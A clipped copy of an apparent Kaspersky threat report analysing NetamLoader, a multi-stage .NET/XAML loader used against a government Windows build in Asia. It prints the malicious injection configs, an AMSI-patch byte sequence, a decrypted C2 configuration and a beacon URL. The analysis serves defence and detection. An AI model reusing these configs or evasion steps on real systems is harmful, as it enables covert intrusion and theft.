---
title: Unknown APT uses NetamLoader to attack a Win10 OS customized for governments in Asia
source: https://securelist.com/netamloader/121676/
source_host: securelist.com
clip_date: 2026-10-31T02:46:20+08:00
trace_id: 931c8b8c-609d-4e01-afcc-025550a80a05
content_hash: 0fc97839551db2cc6331d4756a331d49b3c311797eb95694020e9a95b0f86159
status: synced
tags:
  - 恶意样本
  - 供应链攻击
series: null
feed_source: Kaspersky Securelist
ai_summary: TL;DR：卡巴斯基披露未知 APT 利用 NetamLoader 框架攻击亚洲政府专用的定制版 Win10，疑似供应链攻击，靠多层 XAML 无文件加载与 AMSI 绕过实现隐蔽渗透。
ai_summary_style: key-points
images_status:
  total: 10
  succeeded: 10
  failed_urls: []
notion_page_id: 40975244-d011-81bb-a002-cf1eeb2ff67e
ioc:
  cves: []
  cwes: []
  hashes:
    - 4f28622c5e60c01319bf48cf742fe1a5
    - 514117d536e347560d049cfe0c609632
    - 514ac0d73b8a1b73488ef5e2e55a75c3
    - 67e3617f8709d34f806f8e02badba8a5
    - 9000820d8153c24cd60d53001d3a97b6
    - ab81564bcb8ca7e710c66832de747556
    - b3c4a635179680edafb5d006cf0cffc6
    - c86d53392a87dd3f3e62d62c9b92a9bd
    - cfb8b281bdf5d9390e64b10c312fb2c1
    - e1dc6f1ed193594f2284be22ae08dfa4
    - e4537a1762fcafd2fd96bfc825bad34f9db9a24d
    - f2458ed133f8d0ca19e22c10f577e98e
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> TL;DR：卡巴斯基披露未知 APT 利用 NetamLoader 框架攻击亚洲政府专用的定制版 Win10，疑似供应链攻击，靠多层 XAML 无文件加载与 AMSI 绕过实现隐蔽渗透。
> 
> - **入口与投递：** 恶意 CAB 藏于 Windows 更新下载目录，仅观测到合法工具 PatchMyPC-ScriptRunner.exe 被拉起执行；CAB 内组件多为合法第三方文件，唯一恶意文件是 Resources.resx，强烈指向供应链攻击。
> - **复杂加载链：** 通过 AppDomainManager 注入加载微软签名程序集，利用 DataCacheFactoryConfiguration 设计缺陷读取 fabric.config，经 BinaryFormatter 反序列化（TypeConfuseDelegate 技法）触发漏洞，逐层解密多层 XAML/.NET/JSON 载荷，最终 .NET 2 Plugin 在 dllhost.exe 中执行。
> - **防御规避：** 拆分敏感字符串、劫持 AMSI COM 虚表（用改写的 Console.Clear() 替换 Scan 方法使扫描恒返回 CLEAN）；删除恶意文件、CLR 日志与 Prefetch；置 COMPlus_ETWEnabled=0 隐藏 ETW 事件；借 RPC 在 dllhost.exe 中加载载荷以脱离原进程树绕过 EDR。
> - **C2 与反沙箱：** C2 为 openaigpt4v.com（Cloudflare CDN），流量采用 AES-128-CBC + HMAC 的 Encrypt-then-MAC 加密；初始连接延迟 20-40 分钟，首次执行后约 28 小时退出，无响应时轮询间隔 22-28 小时，专耗尽沙箱超时。
> - **归因与受害者：** KSN 遥测确认亚洲单一受害者；日志路径含 CmitUpdateAgent 关键词印证目标为政府专用定制系统；基于 TTP、代码相似性与基础设施分析，未能关联到任何已知 APT 组织。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/52d67059f9252f38.jpg)

## Introduction

A couple of months ago, our research revealed a highly sophisticated infection chain and a complex.NET assembly-loading framework built on XAML markup, which strongly indicates a supply-chain attack targeting a custom Windows build used exclusively by government entities in Asia. The malicious framework has been labeled NetamLoader; at present, no attribution to any known APT group has been established.

The sample came to light in the first half of 2026, when Kaspersky Security Network (KSN) issued a malware detection alert for a.config file using AppDomainManager injection to load arbitrary.NET assemblies. The file was packaged inside a CAB archive placed in the directory that stores Windows operating system update packages. Initial analysis of the CAB contents found no malicious code: most executables were legitimate components of the third-party patch management tool Patch My PC, and even the.NET assemblies used for the injection were Microsoft-signed. A later re-examination of the original.config file and the full loading process revealed the infection chain and framework described in this report.

Kaspersky’s products detect this threat as HEUR:Trojan.MSIL.NetamLoader.gen, Trojan.MSIL.Zapchast.\*, and Trojan.Script.Agent.\*.

## Background

During routine threat hunting, KSN sent us a malware detection alert. The notification flagged a.config file that employed [AppDomainManager injection](https://3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence) to load arbitrary.NET assemblies. The file was compressed into a CAB archive named e4537a1762fcafd2fd96bfc825bad34f9db9a24d and saved in the folder that stores Windows operating system update packages. Below is the full path to this archive:

```
C:\Windows\SoftwareDistribution\Download\e4537a1762fcafd2fd96bfc825bad34f9db9a24d
```

Starting with this CAB archive, we uncovered a highly complex infection chain that uses a previously unknown advanced loading framework.

## Initial infection

The CAB file contains the following seven files, which are extracted and placed in the path C:\\Windows\\SoftwareDistribution\\Download\\Install\\:

[![Files compressed in the CAB file](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/4dc7fc39b51e7430.png "NetamLoader-01")](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/10/28211641/NetamLoader-01.png)

Files compressed in the CAB file

  
Except for Resources.resx, none of the files contain malicious code. We did not observe how the CAB file was delivered to the victim; we only saw the process PatchMyPC-ScriptRunner.exe running with the following arguments:

```
C:\Windows\SoftwareDistribution\Download\Install\PatchMyPC-ScriptRunner.exe -updatepackage -applicationid=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

After the file is launched in this manner, the infection chain progresses to stage 1.

## Stage 1

Starting with the execution of PatchMyPC-ScriptRunner.exe, which then served as a host process for loading several payloads, we identified a complex two‑stage loading mechanism with multiple steps. The overall flow of stage 1 is summarized in the diagram below.

[![Infection chain: Stage 1](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/5e6a2d32115c19e1.png "NetamLoader-09")](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/10/28211638/NetamLoader-09.png)

Infection chain: Stage 1

### Step 1

The AppDomainManager injection technique is used to load an arbitrary.NET assembly. With this mechanism, when PatchMyPC-ScriptRunner.exe runs, the accompanying configuration file PatchMyPC-ScriptRunner.exe.config in the same directory is loaded before the executable’s main function runs. Below is the content of PatchMyPC‑ScriptRunner.exe.config.

```html
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
    <runtime>
        <appDomainManagerType  value="Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration">
       </appDomainManagerType>
        <appDomainManagerAssembly  value="Microsoft.HostIntegration.Connectors, Version=1.0.0.0, 
                    Culture=neutral, PublicKeyToken=31bf3856ad364e35">
       </appDomainManagerAssembly>
        <NGenAssemblyUsageLog enabled="0" />
    </runtime>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.6" />
    </startup>
</configuration>
```

According to the configuration file, the class `Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration` from the Microsoft.HostIntegration.Connectors.dll module (a Microsoft‑signed assembly) is loaded. `DataCacheFactoryConfiguration` is the configuration class for the Windows Server AppFabric Cache Client, specifying the settings for a new cache client. When the configuration class is loaded, its instance first attempts to find and read the default configuration file, fabric.config, located in the same directory. The contents of fabric.config are shown below:

```html
<?xml version="1.0" encoding="utf-8"?>
<section name="foo">
    <customType className="System.Resources.ResXResourceSet, System.Windows.Forms, 
                Version=4.0.0.0, Culture=neutral, 
                PublicKeyToken=b77a5c561934e089(Resources.resx)" />
</section>
```

### Step 2

The `DataCacheFactoryConfiguration` class has a design flaw that can be abused to load arbitrary assemblies. The fabric.config file is meticulously crafted. When the file is loaded, the `DataCacheFactoryConfiguration` instance examines its `className` attribute, loads the specified type (`System.Resources.ResXResourceSet` from the `System.Windows.Forms` assembly), and creates a `ResXResourceSet` instance, passing “Resources.resx” to its constructor for parsing.

In the.resx file, multiple layers of payloads – including several XAML files,.NET assemblies, and JSON data – are encoded, compressed, or encrypted (see the diagram below). Each layer is unpacked and loaded by the layer above it. Once a layer finishes its operation, the next layer is extracted and loaded. Below, we analyze each layer in the order in which it is loaded:

[![Multiple layers of payloads are compressed and encrypted in the .resx file](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/b46a4be533d97990.png "NetamLoader-04")](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/10/28211605/NetamLoader-04.png)

Multiple layers of payloads are compressed and encrypted in the.resx file

The [Microsoft RESX schema](https://learn.microsoft.com/en-us/dotnet/core/extensions/create-resource-files#resources-in-resx-files) defines the XML layout used by.resx files, which has a human-readable structure and can hold application resources: strings, images, icons, and serialized objects. The Resources.resx file contains a Base64‑encoded binary object that was serialized using the well‑known, highly vulnerable.NET BinaryFormatter class.

[![Base64-encoded serialized binary object in Resources.resx](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8f1dc6df6651bae9.png "NetamLoader-08")](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/10/28211629/NetamLoader-08.png)

Base64-encoded serialized binary object in Resources.resx

Parsing this.resx file with ResXResourceSet causes the embedded Base64‑encoded binary payload to invoke BinaryFormatter.Deserialize(), triggering a deserialization vulnerability that enables a [TypeConfuseDelegate attack](https://hackmd.io/@gjN6_p5wRkqTgU8p5SWx7Q/BJKJjMYn5). The TypeConfuseDelegate then invokes `XamlReader.Parse()`, which loads a [XAML](https://learn.microsoft.com/en-us/dotnet/desktop/wpf/xaml/) payload (named XAML-1) embedded within the binary object.

XAML is a markup language for building user interfaces in.NET applications, but its capabilities extend far beyond that. Using two built‑in objects, [ObjectDataProvider](https://learn.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider) and [ResourceDictionary](https://learn.microsoft.com/en-us/dotnet/api/system.windows.resourcedictionary?view=windowsdesktop-10.0), logic equivalent to C# code can be expressed in an XML‑like syntax.

[![A code snippet of XAML-1](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/031f90e3d0c4dda1.png "NetamLoader-06")](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/10/28211618/NetamLoader-06.png)

A code snippet of XAML-1

### Step 3

The XAML-1 code acts as a loader for an embedded payload. The process is as follows:

1.  Retrieve the full command line of the current host process PatchMyPC‑ScriptRunner.exe, converting all arguments to lowercase.
2.  Generate the AES key by hashing the command‑line string with SHA‑256.
3.  Decode the Base64 string embedded in XAML-1 into a binary array. Use the first 16 bytes of that array as the IV, then decrypt the remaining encrypted data with AES. The decrypted output is another piece of XAML code, which we refer to as XAML-2.
4.  Load XAML-2 into memory using the.NET API [System.Windows.Markup.XamlReader.Load()](https://learn.microsoft.com/en-us/dotnet/api/system.windows.markup.xamlreader.load?view=windowsdesktop-10.0).
5.  If any exception occurs during decryption, trigger `Environment.Exit(0)`, silently terminating the host process to prevent error messages that might reveal the attack.

## Stage 2

XAML‑2 initiates stage 2 of the infection. The diagram below shows the overall flow of this stage.

[![Infection chain: Stage 2](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/821ed6d86b479103.png "NetamLoader-03")](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/10/28211657/NetamLoader-03.png)

Infection chain: Stage 2

XAML‑2 contains two embedded Base64‑encoded sections. These sections are actually two additional XAML files (referred to as XAML-2-1 and XAML-2-2) that were first compressed with ZIP and then encoded in Base64. After decoding and decompressing, XAML-2 loads each file into memory separately with `XamlReader.Load()`.

[![A code snippet of XAML-2](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/859bceda5c91fb38.png "NetamLoader-02")](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/10/28211645/NetamLoader-02.png)

A code snippet of XAML-2

### XAML-2-1

The first file consists of 796 lines. Its sole purpose is to hijack a key [AMSI](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-reference) API to bypass anti‑malware scanning.

[![Sensitive strings in XAML-2-1 are cut into tiny pieces](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/5b7d46e07fbb9121.png "NetamLoader-05")](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/10/28211610/NetamLoader-05.png)

Sensitive strings in XAML-2-1 are cut into tiny pieces

To avoid detection by anti‑malware signature scans, sensitive strings are split into very short fragments. When XAML-2-1 is loaded and parsed, the fragments are reassembled into the original string.

The key steps it takes to achieve its goal are as follows:

1.  Check the OS architecture by verifying whether `IntPtr.Size` equals 8. If it does not, the host process isn’t 64‑bit, so abort the hijack operation.
2.  Combine the split strings into a single CLSID GUID (fdb00e52-a214-4aa1-8fba-4357bb0072ec), then try to create an instance of the AMSI COM object using this GUID.
3.  Patch the AMSI module.
    -   Create a delegate for the runtime method `Console.Clear()` and then obtain its native function pointer. Next, patch the method by overwriting its first bytes in memory with the binary payload (41 C7 00 01 00 00 00 33 C0 C3).
    -   Obtain the native pointer of the AMSI COM object with `Marshal.GetIUnknownForObject()`. From this pointer, read the address of its virtual method table and add 0x18 to reach another pointer that holds the address of the `CAmsiAntimalware::Scan` method.
    -   Use `VirtualProtect()` to make the `Scan()` pointer writable, change its value from the address of the `CAmsiAntimalware::Scan()` method to the address of the patched `Console.Clear()`, and then restore the pointer’s original protection attributes. Once this step is complete, every scan returns `AMSI_RESULT_CLEAN (value = 0)`.

One patch targets the `Console.Clear()` API, which resides in the memory space of an existing legitimate module, while the other modifies only the virtual tables of the AMSI module, allowing the malware to pass code integrity checks.

### XAML-2-2

XAML-2-2 consists of two parts: a.NET module (the first loader,.NET 1 Loader) and a JSON data payload (the C2 configuration, JSON-1). Both components are compressed with ZIP and then encoded in Base64. XAML-2-2 first decodes and decompresses the.NET assembly.NET 1 Loader, then uses the `Assembly.CreateInstance()` API to create an instance of the.NET 1 Loader and passes the Base64‑encoded JSON-1 to the `m.C()` method of.NET 1 Loader as a parameter.

### .NET 1 Loader

.NET 1 Loader decodes, decompresses, and parses JSON‑1. The decoded and decompressed JSON‑1 is shown below:

```
{
    "p": "[Base64‑encoded JSON, which we call JSON‑1-p]"
    "c": "[Base64‑encoded JSON, which we call JSON‑1-c]"
}
```

-   JSON-1-c  
    This JSON contains the configuration data that.NET 1 Loader uses to report the execution results of the loaded payload to the C2 server.
    
    |     |     |     |
    | --- | --- | --- |
    | sc  | false | Flag. Determines whether to report the execution result of `m.C()`. When set to false, reporting to C2 is skipped. |
    | c   | null | Reporting C2 server. The result returned by the `m.C()` method of.NET 1 Loader is sent to this server. |
    | tp  | null | Unknown item, suspected to be a trusted SSL certificate. Thumbprint was used to verify this alleged C2 certificate. |
    | e   | null | The AES key that encrypts the JSON result returned by the `m.C()` method of.NET 1 Loader. |
    
-   JSON-1-p  
    JSON-1-p is a more complex configuration file..NET 1 Loader parses its data to prepare and load the subsequent stages. The following configuration keys store the payloads:
    
    -   `oib`: Base64‑encoded.NET 2 Plugin (PE file)
    -   `oub`: Base64‑encoded XAML that invokes Exit(0)
    -   `ibk`: AES key used to decrypt ibi
    -   `ibi`: A Base64‑encoded collection of compressed, encrypted XAML templates used to build XAML-3. Detailed instructions for decrypting and assembling XAML‑3 are provided in the [XAML‑3](#2) section below.
    
    Other items are passed as C2 configuration to the.NET 2 Plugin at a later stage.
    
    ```json
    [
        {
            "c": [
                {
                    "cu": "https://openaigpt4v.com/model_v4/",
                    "tp": "*",
                    "rh": ""
                }
            ],
            "mib": 79200,
            "mab": 100800,
            "mis": 1200,
            "mas": 2400,
            "e": "9fT04e03tAiZAPogcDWt0w==",
            "ii":  null,
            "aop": null,
            "oib": "TVqQAAMAAAAEAAAA//8AALgAAAAAA...",
            "oub": "PFJlc291cmNlRGljdGlvbmFyeS...",
            "wi": 100801,
            "ibk": "W7BHmIRBRY3FOIfWprbW/ZJh5GbPND3sY+qCBDY7O2A=",
            "ibi": "4pUDtQVbD6leQrDvtT3gaaCLec...",
            "de": false
        }
    ]
    ```
    

After obtaining the configuration,.NET 1 Loader proceeds with the following key steps:

1.  Delete the update records from the system log related to the malicious update packages, along with the malicious files and cache files used in stage 1.
    -   Delete malicious files extracted from the CAB  
        
        ```
        PatchMyPC-ScriptRunner.exe.config
        fabric.config
        Resources.resx
        ```
        
    -   Delete CLR usage logs and Windows system Prefetch cache files to eliminate evidence that could be used in forensic analysis.
        
        ```
        %LOCALAPPDATA%\Microsoft\CLR_v4.0\UsageLogs\PatchMyPC-ScriptRunner.exe.log
        %WINDIR%\Prefetch\PATCHMYPC-SCRIPTRUNNER.EXE-*.pf
        ```
        
    -   Retrieve the files in the folders matching the pattern 20???? at the path below, where each file name starts with “20” followed by six more characters (e.g., 20260101). Read the files’ contents, filter out any lines containing the exact substring GetExtendedUpdateInfoHandler, and write the filtered content back to the log files. The path contains the keyword CmitUpdateAgent, which may be linked to a custom Windows 10 build used by a government in Asia.
        
        ```
        "%WINDIR%\Logs\CmitUpdateAgent\20????\20??????"
        ```
        
2.  Reset a registry‑based exception‑state logging system by deleting the nine GUID keys under the path LocalMachine\\SOFTWARE\\Classes\\appid\\\[specific_GUID\] one at a time, along with all of their child subkeys. The algorithm that generates the GUID path is unique– it derives the GUID from the C2 URL– so each C2 server has its own distinct set of bound GUIDs. Of the nine GUIDs derived using this method, one indicates that an exception occurred, and the others are numbered 0 through 7.  
      
    For example, when the malware catches exception code 129, it creates the registry subkey {bde7ddc2-1f6f-4397-a0df-ae7c7d67d65a} to indicate that an exception occurred. It then checks the bit mask, where 129 equals binary 10000001. Consequently, it creates the eighth subkey {74084115-433e-4fe8-8d01-41c48fbfeef6} and the first subkey {bf6f4bde-97db-4dcd-9546-7ebf10061519}.
3.  Verify that each necessary configuration item exists in JSON-1-p, then validate some of its items against hardcoded values. If any item fails the check, halt the infection chain and submit the execution result to the reporting C2 server.
4.  Verify that the current user is an administrator; if not, throw an exception with code 128.
5.  Check whether the configuration item `aop` exists. If it does, Base64-decode its value, use the result as XAML-3, and skip to step 9.
6.  Generate a unique malware instance ID for the configuration item `ii` by calling `Guid.NewGuid()`.
7.  Query the `SusClientId` value from the registry key SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate. Then generate the value for the newly defined configuration item `si` by computing a GUID using the same algorithm as above. Use the concatenation of the retrieved `SusClientId` value and the byte sequence `\x14\x43\x9B\x64` as the input data for the algorithm.
8.  Parse JSON-1-p, extract the relevant items and their values, and convert them to XAML format. Next, follow the steps outlined in the [XAML-3](#2) section to generate the complex XAML script XAML-3.
9.  Create a COM instance of `WScript.Shell` (CLSID: 41904400-BE18-11D3-A28B-00104BD35090) and retrieve the environment of the current process. Then set the `COMPlus_ETWEnabled` environment variable to 0 to prevent the CLR from registering the.NET ETW provider, which hides the associated events.
10.  Use RPC to create a remote COM object (CLSID: ab8902b4-09ca-4bb6-b78d-a8f59079a8d5). Exploit it via an unknown binary object deserialization vulnerability and the TypeConfuseDelegate technique. Once the exploit succeeds, XAML-3 is loaded into the remote host process dllhost.exe. This is a covert method for initiating a new process that loads the malicious payload XAML‑3. This technique effectively separates the infection chain from its initial process, allowing it to bypass behavioral monitoring by security solutions such as EDR.
11.  The execution result (in JSON format, shown below) is first AES‑encrypted using the key from the item `e`. A randomly generated IV is prepended to the encrypted data, and the result is then Base64‑encoded.
     
     ```ruby
     [
         {
             // Fixed value
             "_": "0202097a-5c1e-460d-b5e0-030b9756b242",
             // Error number: 0 indicates successful execution
             "e": "0 ",
             // Value of config "ii"
             "i": "94aafd58-c00c-402a-aae6-858b4486a1a4"
         }
     ]
     ```
     
12.  POST the encrypted and encoded result to the reporting C2 server.

### XAML-3

XAML-3 is a critical payload that, after leaving the original process tree, is loaded and executed in a different process: dllhost.exe. XAML-3 is generated from template XAML-3. As shown in the diagram below, the template is decoded and decrypted using the value of the ibi item in JSON-1-p. In addition to template XAML‑3, the final decryption includes two other XAML templates (template \__P1\_\_ and template \__P2\_\_).

[![The multi-layer encryption structure of "ibi"](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/dacf17f629bf9ef9.png "NetamLoader-07")](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/10/28211625/NetamLoader-07.png)

The multi-layer encryption structure of “ibi”

The AES key is taken from the config item ibk. The first 16 bytes of the encrypted binary data serve as AES IV 1. After decryption, the data consists of a simple header followed by AES IV 2.

Template XAML‑3 includes two string placeholders, \__P1\_\_ and \__P2\_\_. Each placeholder is replaced with compressed, Base64‑encoded XAML (template \__P1\_\_ and XAML‑P2).

The content of template \__P1\_\_ is identical to XAML-2-1 and bypasses AMSI in the new process. XAML-P2 is generated from the template \__P2\_\_.

Some of the item values in template \__P2\_\_ come from the C2 configuration data in JSON-1-p. Within template \__P2\_\_, the placeholder \__P\_\_ is replaced with a compressed, encoded payload – the.NET 2 Plugin – which is decoded from the oib value in JSON-1-p. After completing all the operations, the template \__P2\_\_ becomes XAML-P2.

The C2 configuration in XAML‑P2 is shown below:

| **Item** | **Value** | **Description** |
| --- | --- | --- |
| ii  | 94aafd58-c00c-402a-aae6-858b4486a1a4 | **Unique ID** for this malware instance (if the `ii` value in the configuration is `null`, the malware will generate a random one). |
| ec  | 9fT04e03tAiZAPogcDWt0w== | **Base64-encoded AES master key:** same as item `e` in JSON-1-p, used for C2 traffic encryption and authentication. |
| bi  | 79200-100800 | **Actual polling delay if the C2 doesn’t respond: 79200-100800 seconds** (22-28 hours) – the code parses the values and multiplies them by 1000 to get milliseconds. This item indicates that the malware uses very long polling intervals. |
| is  | 1200-2400 | **Actual delay: 1200-2400 seconds** (20-40 minutes) – a long delay before the initial connection to the C2 server, used for sandbox evasion. |
| u   | Base64encodedXAML | A short XAML snippet that calls `Environment.Exit(0)` |
| wi  | 100801 | **Actual initial wait: 100801 seconds** (~28 hours). The malware waits approximately 28 hours after initial execution and then exits the process. |
| de  | False | **Local exception logging switch:** when set to `False`, exception logging is enabled. |
| si  | 41bd7f37-c3f6-4a9e-b2f3-5363e9a2c095 | **UID:** generated using a custom method based on the registry key value `SusClientId`. |
| cu  | https://openaigpt4vcom/model_v4/ | **Command-and-control (C2) server** URL taken from the C2 server list. |
| tp  | \*  | **Trusted SSL certificate thumbprint:** `*` indicates that any certificate is trusted (disabling SSL pinning/validation). This entry also appears in a list, corresponding to the C2 item `cu`. |
| rh  |     | **Additional route header/data:** not configured in this instance. |

When dllhost.exe loads XAML-3, it loads template \__P1\_\_ and XAML-P2 one by one. When XAML-P2 loads, it retrieves the current domain via `AppDomain.GetCurrentDomain()` and then stores the values of the C2 configuration items (`cu`, `tp`, and `rh`; see the table above) in that domain using `AppDomain.SetData()`. Finally, XAML-P2 decodes and decompresses the embedded payload (.NET 2 Plugin), loads the.NET 2 Plugin into the current domain, and then calls the plugin’s entry method, `m.C()`.

### .NET 2 Plugin

This payload is a.NET assembly (PE file). As discussed above, it is loaded by XAML-P2 into the host process dllhost.exe. In the plugin’s entry method `m.C()`, a thread is spawned to execute the malicious operations.

The following key steps are executed in this thread:

1.  **Configuration initialization**: Load the C2 configuration from the current AppDomain’s data storage and assign it to the corresponding member variables.
2.  **Gather system information from the registry:**
    -   ```
        "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\full", Key="Version"
        "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", Key="BuildLab"
        ```
        
    -   Combine the queried values into a single string, for example: `"4.7.03190\n17763.rs5_release.180914-1434"`. If any query fails, replace its result with a hyphen (“-“).
3.  **Clear the state of the exception‑state logging system:**.NET 2 Plugin uses the same exception‑state logging system as the.NET 1 Loader.
    -   Recursively delete 12 GUID subkeys from the registry. The algorithm that generates the GUID path is the same as the one used by.NET 1 Loader. The first eight GUIDs are the same as those that.NET 1 Loader attempted to remove. The remaining four GUIDs were generated using different integer seeds (integer seed = \[From 1 to 4\]|65536).
    -   If steps 1 and 2 are completed successfully, generate a subkey using the integer seed 3|65536. Then create the following registry subkey:
    -   ```
        "LocalMachine\SOFTWARE\Classes\appid\{ff259bcd-2f0a-44de-b34a-0092fec1d8a2}
        DllSurrogate = ""
        ```
        
4.  **Anti-analysis:** Check whether the current host process is dllhost.exe by examining `Environment.CommandLine`.
5.  **Prevent the host process from exiting:** Create a managed object and retrieve its `IUnknown` interface. Then call ole32.dll’s `CoLockObjectExternal(IUnknown interface)` to lock the object in memory, ensuring that the dllhost.exe process created by RPC is not released by the system.
6.  **Jitter delay:** Before the initial request to the C2 server, wait for a random jitter delay of 20-40 minutes (set by the configuration item “is”=”1200-2400”) to evade sandboxes by causing them to time out.
7.  **Set maximum execution time**: Create a timer that registers a callback function as a watchdog. The timer waits approximately **28 hours** (100801 seconds, retrieved from the configuration item `wi`) before invoking the callback. The callback fetches the configuration item `u`, decodes its Base64‑encoded string, decompresses the output, and extracts a XAML snippet from the resulting data. It then loads this XAML, which ultimately triggers `Environment.Exit(0)`.
8.  **Periodic polling:**
    1.  Retrieve the config items `cu` and `ii` to build the full URL https://openaigpt4v.com/model_v4/94aafd58-c00c-402a-aae6-858b4486a1a4
    2.  Obtain the system proxy using three methods (see the [Discovering proxies](#3) section below).
    3.  Register an HTTPS callback (`ServerCertificateValidationCallback`) that verifies the server‑side X.509 certificate against the configuration value tp before establishing the connection.
    4.  Then, combine the system information with additional details, such as whether the proxy is bypassed, whether it is using a proxy, and the current index in the C2 server list.
    5.  Next, encrypt the combined data with AES (see the [AES encryption diagram in the network traffic](#4) section for more details), and then encode the encrypted output in Base64.
        
        ```
        // Final HTTP request URL
        "https://openaigpt4v[.]com/model_v4/94aafd58-c00c-402a-aae6-858b4486a1a4?b=lM4V3VwrWtXBy4oBGUkXOHfxyLUlrT2hIZGn4C37W1Z3%2FeW1WURJqzaNLQhGFHsWxA2lpJHZSpd8VDLMOQRD%2FfsDswnomIrBpoaNzug3dOtrh1J2KIqZRmKx1TtQsxq1RAGu1y45rSKaPHm9s2HF8A%3D%3D&c=41bd7f37-c3f6-4a9e-b2f3-5363e9a2c095"
        ```
        
    6.  Hijack the HTTP User-Agent and replace the value following HOST: with the config value of item `rh`.
    7.  Retrieve a XAML file from the C2 server, update the configuration data, and load the retrieved XAML (for more details on techniques, see the [Execute downloaded XAML payload in an isolated AppDomain](#1) section).
    8.  If a valid response is received from C2, the loop pauses for 5-6 minutes before the next request; otherwise, it pauses for 22-28 hours, checking every 10 minutes to determine whether the allotted time has elapsed.

### AES encryption scheme for network traffic

All traffic between the malware and the C2 server is encrypted and authenticated using AES‑128‑CBC with HMAC. The encryption and authentication keys are derived from a master key – specified in the configuration as `"ec"="9fT04e03tAiZAPogcDWt0w=="` – by applying HMAC with distinct seed values.

For a given master key and a single-byte seed, the derivation works as follows:

1.  Generate a 16‑byte sequence from the seed; this serves as the HMAC key.
2.  Compute HMAC‑SHA256 over the master key to obtain an intermediate key.
3.  Use this intermediate key as the HMAC key to compute HMAC‑SHA256 on the constant byte 0x01.
4.  Take the first 16 bytes of the resulting hash; this becomes the final derived key.

Accordingly, the server-side encryption and decryption keys mirror those on the client (malware) side.

| Seed | Key type generated (client side) | Key type generated (server side) |
| --- | --- | --- |
| 0   | Decryption key | Encryption key |
| 1   | Decryption authentication key | Encryption authentication key |
| 2   | Encryption key | Decryption key |
| 3   | Encryption authentication key | Decryption authentication key |

The code implements an encapsulation of AES-CBC encryption combined with HMAC-SHA256 integrity verification. It uses a randomly generated IV to symmetrically encrypt the plaintext in CBC mode and produces ciphertext. Next, it calculates an SHA256 message authentication code for the concatenated “IV+ciphertext” using a separate HMAC key. Finally, it concatenates the three segments – IV (16 bytes) | ciphertext | HMAC (32 bytes) – into a single byte array that constitutes the final encrypted message. This follows the standard cryptographic [Encrypt-then-MAC](https://en.wikipedia.org/wiki/Authenticated_encryption#Encrypt-then-MAC_\(EtM\)) construction. The receiver must validate the HMAC before decrypting with the corresponding key and IV, which ensures confidentiality, integrity, and tamper resistance.

### Discovering proxies

.NET 2 Plugin detects the system proxy using three methods:

-   Retrieve the system‑wide proxy configuration using the Win32 WinHTTP API function [WinHttpGetDefaultProxyConfiguration()](https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpgetdefaultproxyconfiguration), then extract the proxy server with the regular expression `(?:([a-zA-Z]+)=)?(.*)`.
-   If that fails, locate the running explorer.exe process, impersonate its access token using `Impersonate()`, and retrieve its proxy configuration with the.NET API `WebProxy.GetDefaultProxy()`.
-   If both methods fail, fall back to obtaining the proxy from the.NET property `DefaultWebProxy`.

These methods ensure that the malware can reach external networks even in complex network environments with proxies.

### Execute downloaded XAML payload in an isolated AppDomain

This technique abuses `MulticastDelegate` again by using reflection to modify its private `_invocationList` array..NET 2 Plugin creates a multicast delegate (`CrossAppDomainDelegate`) and replaces one entry in its invocation list with a malicious delegate pointing to `XamlReader.Parse()`. When `AppDomain.DoCallBack()` executes this multicast delegate, it iterates through the invocation list and invokes the injected `XamlReader.Parse()` to parse and execute the downloaded XAML.

In more detail, the process is as follows:

1.  Create a new isolated AppDomain with a randomly generated GUID as its name.
2.  Copy all configuration data from the current AppDomain into the new one.
3.  Set the proxy information in the new AppDomain and assign it to the variable `px`.
4.  Use TypeConfuseDelegate to replace `TimeZoneInfo.ClearCachedData()` with `XamlReader.Parse()`, thereby modifying the `MulticastDelegate(CrossAppDomainDelegate)`.
5.  Use `appDomain.DoCallBack()` to invoke `XamlReader.Parse()` within the isolated AppDomain, executing the downloaded XAML payload.
6.  Transfer any updated configuration data from the new AppDomain back to the original AppDomain.
7.  Unload the isolated AppDomain to complete the cleanup.

This technique keeps the downloaded malicious payload out of the main AppDomain, which increases stability and allows the payload to be fully cleaned up after execution.

## Infrastructure

The attack relies on commercial hosting infrastructure. The C2 IP is part of Cloudflare’s CDN, and the domain name is registered with Cloudflare.

| **Domain** | **IP** | **First seen** | **Domain Registrar/ASN** |
| --- | --- | --- | --- |
| openaigpt4v\[.\]com | 104.18.14\[.\]219 | Sep 27, 2023 | Cloudflare, Inc. / 15169 |

